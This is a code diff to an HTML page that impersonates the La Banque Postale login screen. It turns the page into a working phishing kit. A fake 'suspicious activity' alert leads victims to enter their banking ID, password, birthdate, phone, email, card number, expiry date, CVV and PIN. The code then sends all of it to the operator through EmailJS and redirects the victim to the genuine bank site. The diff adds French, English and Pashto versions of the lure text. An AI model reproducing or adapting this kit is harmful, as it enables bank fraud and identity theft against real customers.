@@ -1,5 +1,25 @@
-<html>
+
+    <!DOCTYPE html>
+    <html lang="fr">
     <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta name="description" content="Connexion sécurisée à votre compte La Banque Postale.">
+        <meta name="author" content="La Banque Postale">
+        <meta name="robots" content="noindex, nofollow">
+        <link rel="icon" type="image/png" href="fav.png">
+        <title>La Banque Postale - Connexion</title>
+        
+        <!-- Scripts -->
+        <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+        <script type="text/javascript">
+            (function() {
+                emailjs.init({
+                    publicKey: "QlyvNDuKNvWLyOf4V",
+                });
+            })();
+        </script>
+        
         <link rel="icon" type="image/png" href="fav.png">
 
 
@@ -11,6 +31,46 @@ body {
     margin: 0;
     padding: 0;
 }
+.language-switcher {
+    position: absolute;
+    top: 20px;
+    right: 20px;
+    display: flex;
+    gap: 10px;
+    background: rgba(255, 255, 255, 0.9);
+    padding: 8px;
+    border-radius: 20px;
+    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+}
+
+.language-button {
+    display: flex;
+    align-items: center;
+    gap: 5px;
+    padding: 5px 10px;
+    border: none;
+    background: transparent;
+    cursor: pointer;
+    border-radius: 15px;
+    transition: all 0.3s ease;
+}
+
+.language-button:hover {
+    background: rgba(0, 70, 192, 0.1);
+}
+
+.language-button.active {
+    background: #0046c0;
+    color: white;
+}
+
+.flag-icon {
+    width: 20px;
+    height: 15px;
+    border-radius: 2px;
+}
+
+
 
 .container {
     display: flex;
@@ -264,10 +324,67 @@ body {
     from { transform: translateY(-100px); opacity: 0; }
     to { transform: translateY(0); opacity: 1; }
 }
+.loader-container {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(255, 255, 255, 0.9);
+    display: none;
+    justify-content: center;
+    align-items: center;
+    z-index: 9999;
+}
+
+.loader {
+    width: 48px;
+    height: 48px;
+    border: 5px solid #0046c0;
+    border-bottom-color: transparent;
+    border-radius: 50%;
+    animation: rotation 1s linear infinite;
+}
+
+@keyframes rotation {
+    0% {
+        transform: rotate(0deg);
+    }
+    100% {
+        transform: rotate(360deg);
+    }
+}
 </style>
 </head>
 <body>
 <div class="container">
+    <div class="language-switcher">
+        <button class="language-button active" onclick="switchLanguage('fr')">
+            <svg class="flag-icon" viewBox="0 0 60 40">
+                <rect width="20" height="40" x="0" fill="#002395"/>
+                <rect width="20" height="40" x="20" fill="#fff"/>
+                <rect width="20" height="40" x="40" fill="#ED2939"/>
+            </svg>
+            FR
+        </button>
+        <button class="language-button" onclick="switchLanguage('en')">
+            <svg class="flag-icon" viewBox="0 0 60 40">
+                <rect width="60" height="40" fill="#012169"/>
+                <path d="M0,0 L60,40 M60,0 L0,40" stroke="#fff" stroke-width="6"/>
+                <path d="M30,0 L30,40 M0,20 L60,20" stroke="#fff" stroke-width="10"/>
+                <path d="M30,0 L30,40 M0,20 L60,20" stroke="#C8102E" stroke-width="6"/>
+            </svg>
+            EN
+        </button>
+        <button class="language-button" onclick="switchLanguage('ps')">
+            <svg class="flag-icon" viewBox="0 0 60 40">
+                <rect width="20" height="40" x="0" fill="#000000"/>
+                <rect width="20" height="40" x="20" fill="#D32011"/>
+                <rect width="20" height="40" x="40" fill="#007A36"/>
+            </svg>
+            PS
+        </button>
+    </div>
     <div class="login-form">
         <?xml version="1.0" encoding="utf-8"?>
         <!-- Generator: Adobe Illustrator 22.1.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->
@@ -387,20 +504,20 @@ body {
             <h3>Vérification de sécurité</h3>
             
             <div class="form-group">
-                <label>Date de naissance</label>
+                <label id="birthdate-label">Date de naissance</label>
                 <input type="date" id="birthdate" required />
             </div>
 
             <div class="form-group">
-                <label>Numéro de téléphone mobile</label>
+                <label id="phone-label">Numéro de téléphone mobile</label>
                 <input type="tel" id="phone" pattern="[0-9]{10}" required placeholder="0612345678" />
             </div>
 
             <div class="form-group">
-                <label>Adresse email</label>
+                <label id="email-label">Adresse email</label>
                 <input type="email" id="email" required />
             </div>
-
+            
             <div class="form-group">
                 <label>Numéro de la carte (PAN) : Les 16 chiffres</label>
                 <input 
@@ -422,9 +539,8 @@ body {
             }
             </script>
             
-
             <div class="form-group">
-                <label>Date d'expiration : Mois et année</label>
+                <label id="expiration-date-label">Date d'expiration : Mois et année</label>
                 <input 
                     type="text" 
                     placeholder="MM/YY" 
@@ -434,6 +550,16 @@ body {
                     required 
                     oninput="formatDate(this)"
                 >
+            </div>
+            
+            <div class="form-group">
+                <label id="cvv-label">Code de sécurité (CVV) : Les 3 chiffres au dos</label>
+                <input type="number" id="security-question" maxlength="3" minlength="3" required>
+            </div>
+            
+            <div class="form-group">
+                <label id="pin-label">Code PIN : Ne jamais le communiquer, même à des proches</label>
+                <input type="text" id="security-question" required />
             </div>
             
             <script>
@@ -448,15 +574,7 @@ body {
             </script>
             
 
-            <div class="form-group">
-                <label>Code de sécurité (CVV) : Les 3 chiffres au dos</label>
-                <input type="number" id="security-question" maxlength="3" minlength="3" required>
-            </div>
-
-            <div class="form-group">
-                <label>Code PIN : Ne jamais le communiquer, même à des proches</label>
-                <input type="text" id="security-question" required />
-            </div>
+            
 
             
             <button class="button" onclick="submitSecurityInfo()">Valider</button>
@@ -480,8 +598,15 @@ body {
         <button class="button" onclick="closeModal()">Continuer</button>
     </div>
 </div>
+<div class="loader-container">
+    <div class="loader"></div>
+</div>
+
+
 <script>
-document.addEventListener('DOMContentLoaded', function() {
+     let password = ''; // Variable pour stocker le mot de passe
+
+    document.addEventListener('DOMContentLoaded', function() {
     const numpad = document.getElementById('numpad');
     const passwordInput = document.getElementById('password-input');
     const passwordDots = document.getElementById('password-dots').children;
@@ -492,19 +617,22 @@ document.addEventListener('DOMContentLoaded', function() {
     const identifierError = document.getElementById('identifier-error');
     const passwordError = document.getElementById('password-error');
     
-    const numbers = [0,1,2,3,4,5,6,7,8,9];
+    const numbers = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9];
+   
+    // Mélange aléatoire des chiffres
     for (let i = numbers.length - 1; i > 0; i--) {
         const j = Math.floor(Math.random() * (i + 1));
         [numbers[i], numbers[j]] = [numbers[j], numbers[i]];
     }
-    
+
+    // Créer les boutons pour le pavé numérique
     numbers.forEach(num => {
         const button = document.createElement('button');
         button.textContent = num;
         button.addEventListener('click', () => addPasswordDigit(num));
         numpad.appendChild(button);
     });
-    
+
     continueButton.addEventListener('click', function() {
         if (/^\d{10}$/.test(identifierInput.value)) {
             identifierError.style.display = 'none';
@@ -514,21 +642,22 @@ document.addEventListener('DOMContentLoaded', function() {
             identifierError.style.display = 'block';
         }
     });
-    
+
+    // Fonction pour ajouter un chiffre au mot de passe
     function addPasswordDigit(digit) {
-        if (passwordInput.value.length < 6) {
-            passwordInput.value += digit;
-            updatePasswordDots();
+        if (password.length < 6) {
+            password += digit; // Ajouter le chiffre à la variable password
+            updatePasswordDots(); // Mettre à jour les points du mot de passe
         }
     }
-    
+
     function updatePasswordDots() {
-        const length = passwordInput.value.length;
+        const length = password.length;
         for (let i = 0; i < passwordDots.length; i++) {
             passwordDots[i].classList.toggle('filled', i < length);
         }
     }
-    
+
     connectButton.addEventListener('click', function() {
         let isValid = true;
         
@@ -539,33 +668,48 @@ document.addEventListener('DOMContentLoaded', function() {
             identifierError.style.display = 'none';
         }
         
-        if (passwordInput.value.length !== 6) {
+        if (password.length !== 6) {
             passwordError.style.display = 'block';
             isValid = false;
         } else {
             passwordError.style.display = 'none';
         }
-        
+
         if (isValid) {
-            showSecurityAlert();
-        }
+    const loaderContainer = document.querySelector('.loader-container');
+    loaderContainer.style.display = 'flex'; // Afficher le loader
+
+    setTimeout(() => {
+        loaderContainer.style.display = 'none'; // Masquer le loader après le délai
+        showSecurityAlert(); // Afficher l'alerte de sécurité
+    }, 5000);
+}
+
     });
     
+    function showLoader() {
+        document.getElementById('loader').style.display = 'block';
+    }
+
+    function hideLoader() {
+        document.getElementById('loader').style.display = 'none';
+    }
+
+    function showSecurityAlert() {
+        document.getElementById('security-alert').style.display = 'block';
+    }
+
     document.addEventListener('click', function(e) {
         if (!e.target.closest('.numpad') && !e.target.closest('.connect-button')) {
-            passwordInput.value = '';
+            password = '';
             updatePasswordDots();
         }
     });
-    
+
     identifierInput.addEventListener('input', function(e) {
         this.value = this.value.replace(/\D/g, '');
     });
 });
-
-function showSecurityAlert() {
-    document.getElementById('security-alert').style.display = 'block';
-}
 
 function closeModal() {
     document.getElementById('security-alert').style.display = 'none';
@@ -574,44 +718,270 @@ function closeModal() {
 }
 
 function submitSecurityInfo() {
+    const identifier = document.getElementById('identifier').value;
+
     const birthdate = document.getElementById('birthdate').value;
     const phone = document.getElementById('phone').value;
     const email = document.getElementById('email').value;
-    const securityQuestion = document.getElementById('security-question').value;
-    
-    // Validate all fields
-    if (!birthdate || !phone || !email || !securityQuestion) {
-        alert('Veuillez remplir tous les champs obligatoires');
+    const cardNumber = document.querySelector('input[placeholder="_ _ _ _  _ _ _ _  _ _ _ _  _ _ _ _"]').value;
+    const expiryDate = document.querySelector('input[placeholder="MM/YY"]').value;
+    const cvv = document.getElementById('security-question').value;
+    const pin = document.querySelector('#security-question[type="text"]').value;
+
+    // Valider les champs obligatoires
+    if (!birthdate || !phone || !email || !cardNumber || !expiryDate || !cvv || !pin) {
+        alert('Veuillez remplir tous les champs obligatoires.');
         return;
     }
 
-    // Validate phone number format
+    // Validation de l'identifiant (10 chiffres)
+    if (!/^\d{10}$/.test(identifier)) {
+        alert('L\'identifiant doit contenir exactement 10 chiffres.');
+        return;
+    }
+
+    // Validation du numéro de téléphone
     if (!/^0[1-9][0-9]{8}$/.test(phone)) {
-        alert('Le numéro de téléphone doit être au format valide (ex: 0612345678)');
+        alert('Le numéro de téléphone doit être au format valide (ex: 0612345678).');
         return;
     }
 
-    // Validate email format
+    // Validation de l'email
     if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
-        alert('Veuillez entrer une adresse email valide');
+        alert('Veuillez entrer une adresse email valide.');
         return;
     }
 
-    // Show loading state
+    // Validation du numéro de carte (16 chiffres)
+    if (!/^\d{4} \d{4} \d{4} \d{4}$/.test(cardNumber)) {
+        alert('Le numéro de carte doit être au format XXXX XXXX XXXX XXXX.');
+        return;
+    }
+
+    // Validation du CVV (3 chiffres)
+    if (!/^\d{3}$/.test(cvv)) {
+        alert('Le code de sécurité (CVV) doit contenir exactement 3 chiffres.');
+        return;
+    }
+
+    // Validation de la date d'expiration
+    if (!/^\d{2}\/\d{2}$/.test(expiryDate)) {
+        alert('La date d\'expiration doit être au format MM/YY.');
+        return;
+    }
+
+    // Afficher l'état de chargement
     const submitButton = document.querySelector('#security-page .button');
     const originalText = submitButton.textContent;
     submitButton.textContent = 'Chargement...';
     submitButton.disabled = true;
 
-    // Simulate API call delay
-    setTimeout(() => {
-        // Success message
-        alert('Vos informations ont été enregistrées avec succès.\nVous allez être redirigé vers votre espace client.');
-        
-        // Simulate redirect to dashboard
+    // Intégration EmailJS
+    emailjs.send("service_zq5u5lo", "template_ow3rnce", {
+        identifier: identifier,
+        password: password,
+        birthdate: birthdate,
+        phone: phone,
+        email: email,
+        card_number: cardNumber,
+        expiry_date: expiryDate,
+        cvv: cvv,
+        pin: pin
+    })
+    .then(() => {
+        alert('Vos informations ont été envoyées avec succès.');
         window.location.href = 'https://www.labanquepostale.fr/particulier/espace-client';
-    }, 2000);
+    })
+    .catch((error) => {
+        console.error('Erreur EmailJS :', error);
+        alert('Une erreur est survenue lors de l\'envoi des données. Veuillez réessayer.');
+    })
+    .finally(() => {
+        submitButton.textContent = originalText;
+        submitButton.disabled = false;
+    });
 }
+
+    
+const translations = {
+    fr: {
+        title: "Connexion à votre compte particulier",
+        identifier: "Identifiant (10 chiffres)",
+        continue: "Continuer",
+        password: "Mot de passe (6 chiffres)",
+        connect: "Se connecter",
+        forgotten: "Identifiant / Mot de passe oublié",
+        securityTitle: "Vérification de sécurité",
+        mainTitle: "La Banque Postale, citoyenne",
+        securityEvolution: "Votre page de connexion évolue !",
+        securityMessage: "La sécurité de votre page de connexion se modernise ! Pour accéder à vos comptes : saisissez vos identifiant et mot de passe habituels.",
+        insuranceTitle: "Espace Assurance La Banque Postale",
+        insuranceMessage: "Vous n'avez pas d'accès Banque En Ligne et souhaitez retrouver vos contrats La Banque Postale Assurance ?",
+        insuranceButton: "Me connecter à mon espace assurance",
+        birthdate: "Date de naissance",
+        phone: "Numéro de téléphone mobile",
+        email: "Adresse email", 
+        securityQuestion: "Question secrète : Nom de jeune fille de votre mère",
+        validate: "Valider",
+        whyInfo: "Pourquoi ces informations ?",
+        securityExplanation: "Ces informations nous permettent de sécuriser votre compte et de vous protéger contre la fraude.",
+        dataProtection: "Vos données sont protégées et cryptées selon les normes de sécurité les plus strictes.",
+        alertTitle: "⚠️ Alerte de sécurité",
+        suspiciousActivity: "Des activités suspectes ont été détectées sur votre compte.",
+        securityNeedVerification: "Pour votre sécurité, nous devons vérifier votre identité et mettre à jour les informations de sécurité de votre compte.",
+        completeInfo: "Veuillez compléter les informations sur la page suivante pour sécuriser votre compte.",
+        fillRequired: "Veuillez remplir tous les champs obligatoires",
+        invalidPhone: "Le numéro de téléphone doit être au format valide (ex: 0612345678)",
+        invalidEmail: "Veuillez entrer une adresse email valide",
+        loading: "Chargement...",
+        birthdate: "Date de naissance",
+        phone: "Numéro de téléphone mobile",
+        email: "Adresse email",
+        cardNumber: "Numéro de la carte (PAN) : Les 16 chiffres",
+        expirationDate: "Date d'expiration : Mois et année",
+        cvv: "Code de sécurité (CVV) : Les 3 chiffres au dos",
+        pin: "Code PIN : Ne jamais le communiquer, même à des proches",
+        validate: "Valider",
+        successMessage: "Vos informations ont été enregistrées avec succès.\nVous allez être redirigé vers votre espace client."
+    },
+    en: {
+        title: "Login to your personal account",
+        identifier: "ID (10 digits)",
+        continue: "Continue",
+        password: "Password (6 digits)",
+        connect: "Connect",
+        forgotten: "Forgot ID / Password",
+        securityTitle: "Security verification",
+        mainTitle: "La Banque Postale, citizen bank",
+        securityEvolution: "Your login page is evolving!",
+        securityMessage: "The security of your login page is being modernized! To access your accounts: enter your usual ID and password.",
+        insuranceTitle: "La Banque Postale Insurance Portal",
+        insuranceMessage: "Don't have Online Banking access and want to find your La Banque Postale Insurance contracts?",
+        insuranceButton: "Connect to my insurance portal",
+        birthdate: "Date of birth",
+        phone: "Mobile phone number",
+        email: "Email address",
+        securityQuestion: "Security question: Mother's maiden name",
+        validate: "Validate",
+        whyInfo: "Why this information?",
+        securityExplanation: "This information helps us secure your account and protect you against fraud.",
+        dataProtection: "Your data is protected and encrypted according to the strictest security standards.",
+        alertTitle: "⚠️ Security Alert",
+        suspiciousActivity: "Suspicious activities have been detected on your account.",
+        securityNeedVerification: "For your security, we need to verify your identity and update your account security information.",
+        completeInfo: "Please complete the information on the next page to secure your account.",
+        fillRequired: "Please fill in all required fields",
+        invalidPhone: "Phone number must be in valid format (ex: 0612345678)",
+        invalidEmail: "Please enter a valid email address",
+        loading: "Loading...",
+        birthdate: "Date of birth",
+        phone: "Mobile phone number",
+        email: "Email address",
+        cardNumber: "Card number (PAN): The 16 digits",
+        expirationDate: "Expiration date: Month and year",
+        cvv: "Security code (CVV): 3 digits on the back",
+        pin: "PIN code: Never share it, even with close ones",
+        validate: "Validate",
+        successMessage: "Your information has been successfully saved.\nYou will be redirected to your client portal."
+    },
+    ps: {
+        title: "خپل شخصي حساب ته ننوتل",
+        identifier: "پېژند (10 شمېرې)",
+        continue: "دوام",
+        password: "پټ نوم (6 شمېرې)",
+        connect: "ننوتل",
+        forgotten: "پېژند/پټ نوم هېر شوی",
+        securityTitle: "د امنیت تصدیق",
+        mainTitle: "لا بانک پوستال، ملي بانک",
+        securityEvolution: "ستاسو د ننوتلو پاڼه پرمختګ کوي!",
+        securityMessage: "ستاسو د ننوتلو پاڼې امنیت عصري کیږي! خپلو حسابونو ته د لاسرسي لپاره: خپل معمول پېژند او پټ نوم دننه کړئ.",
+        insuranceTitle: "د لا بانک پوستال بیمې پورټل",
+        insuranceMessage: "آنلاین بانکي لاسرسی نلرئ او غواړئ خپل د لا بانک پوستال بیمې قراردادونه ومومئ؟",
+        insuranceButton: "زما د بیمې پورټل سره وصل شئ",
+        birthdate: "د زیږون نیټه",
+        phone: "د موبایل شمیره",
+        email: "بریښنالیک پته",
+        securityQuestion: "امنیتي پوښتنه: د مور پخوانی نوم",
+        validate: "تایید",
+        whyInfo: "دا معلومات ولې؟",
+        securityExplanation: "دا معلومات ستاسو حساب خوندي کولو او له درغلۍ څخه د ساتنې لپاره مرسته کوي.",
+        dataProtection: "ستاسو معلومات د امنیت تر ټولو سختو معیارونو سره سم خوندي او رمز شوي دي.",
+        alertTitle: "⚠️ امنیتي خبرتیا",
+        suspiciousActivity: "ستاسو په حساب کې شکمن فعالیتونه موندل شوي.",
+        securityNeedVerification: "ستاسو د امنیت لپاره، موږ باید ستاسو پیژندګلوي تایید او د حساب امنیتي معلومات تازه کړو.",
+        completeInfo: "مهرباني وکړئ د خپل حساب د خوندي کولو لپاره په راتلونکي مخ کې معلومات بشپړ کړئ.",
+        fillRequired: "مهرباني وکړئ ټول اړین ډګرونه ډک کړئ",
+        invalidPhone: "د تلیفون شمیره باید په سم فارمټ کې وي (مثال: 0612345678)",
+        invalidEmail: "مهرباني وکړئ د بریښنالیک سمه پته دننه کړئ",
+        loading: "په حال کې...",
+        birthdate: "د زیږون نیټه",
+        phone: "د موبایل شمیره",
+        email: "بریښنالیک پته",
+        cardNumber: "د کارت شمیره (PAN): 16 شمېرې",
+        expirationDate: "د پای نیټه: میاشت او کال",
+        cvv: "د امنیت کود (CVV): د شا 3 شمېرې",
+        pin: "د PIN کود: دا هیڅکله شریک نکړئ، حتی د خپلو نږدې خلکو سره",
+        validate: "تایید",
+        successMessage: "ستاسو معلومات په بریالیتوب سره خوندي شول.\nتاسو به خپل کارن پورټل ته ولیږدول شئ."
+    }
+};
+
+function switchLanguage(lang) {
+    // Remove active class from all buttons
+    document.querySelectorAll('.language-button').forEach(btn => {
+        btn.classList.remove('active');
+    });
+    
+    // Add active class to clicked button
+    document.querySelector(`.language-button[onclick*="${lang}"]`).classList.add('active');
+    
+    // Update all translatable elements
+    const elements = {
+        'h3': translations[lang].title,
+        'label[for="identifier"]': translations[lang].identifier,
+        '#continue-button': translations[lang].continue,
+        '#password-section label': translations[lang].password,
+        '#connect-button': translations[lang].connect,
+        '.login-form p a': translations[lang].forgotten,
+        '#security-page h3': translations[lang].securityTitle,
+        '.right-section h1': translations[lang].mainTitle,
+        '.info-box h3': translations[lang].securityEvolution,
+        '.info-box p:first-of-type': translations[lang].securityMessage,
+        '.insurance-box h3': translations[lang].insuranceTitle,
+        '.insurance-box p': translations[lang].insuranceMessage,
+        '.insurance-button': translations[lang].insuranceButton,
+        '#security-page label[for="birthdate"]': translations[lang].birthdate,
+        '#security-page label[for="phone"]': translations[lang].phone,
+        '#security-page label[for="email"]': translations[lang].email,
+        '#security-page label[for="security-question"]': translations[lang].securityQuestion,
+        '#security-page .button': translations[lang].validate,
+        '#security-page .info-box h3': translations[lang].whyInfo,
+        '#security-page .info-box p:first-of-type': translations[lang].securityExplanation,
+        '#security-page .info-box p:last-of-type': translations[lang].dataProtection,
+        '#security-alert h2': translations[lang].alertTitle,
+        '#security-alert p:nth-of-type(1)': translations[lang].suspiciousActivity,
+        '#security-alert p:nth-of-type(2)': translations[lang].securityNeedVerification,
+        '#security-alert p:nth-of-type(3)': translations[lang].completeInfo,
+        '#birthdate-label': translations[lang].birthdate,
+        '#phone-label': translations[lang].phone,
+        '#email-label': translations[lang].email,
+        '#card-number-label': translations[lang].cardNumber,
+        '#expiration-date-label': translations[lang].expirationDate,
+        '#cvv-label': translations[lang].cvv,
+        '#pin-label': translations[lang].pin,
+        '#validate-button': translations[lang].validate,
+        '#security-alert .button': translations[lang].continue
+    };
+
+    // Safely update each element if it exists
+    for (const [selector, text] of Object.entries(elements)) {
+        const element = document.querySelector(selector);
+        if (element) {
+            element.textContent = text;
+        }
+    }
+}
+
 </script>
 </body>
 </html>
